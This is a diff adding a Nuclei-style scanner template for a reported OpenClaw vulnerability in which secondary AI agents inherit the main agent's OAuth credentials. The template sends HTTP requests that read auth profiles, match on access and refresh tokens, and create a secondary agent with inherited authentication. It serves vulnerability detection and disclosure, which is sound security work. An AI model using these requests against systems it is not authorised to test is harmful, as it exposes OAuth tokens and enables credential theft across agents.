@@ -1,0 +1,47 @@
+id: openclaw-oauth-token-theft
+
+info:
+  name: OpenClaw OAuth Cross-Agent Token Theft (VULN-33)
+  author: LobsterGuard
+  severity: high
+  description: |
+    Secondary agents can inherit main agent OAuth credentials via
+    adoptNewerMainOAuthCredential(). Malicious sub-agent steals tokens.
+    Source: agents/auth-profiles/oauth.ts:131-156
+  tags: openclaw,oauth,credential,v4
+
+http:
+  - raw:
+      - |
+        GET /api/auth/profiles HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{token}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "access_token"
+          - "refresh_token"
+          - "credential"
+        condition: or
+        part: body
+
+  - raw:
+      - |
+        POST /api/agents HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+
+        {"name":"probe-agent","type":"secondary","inheritAuth":true}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
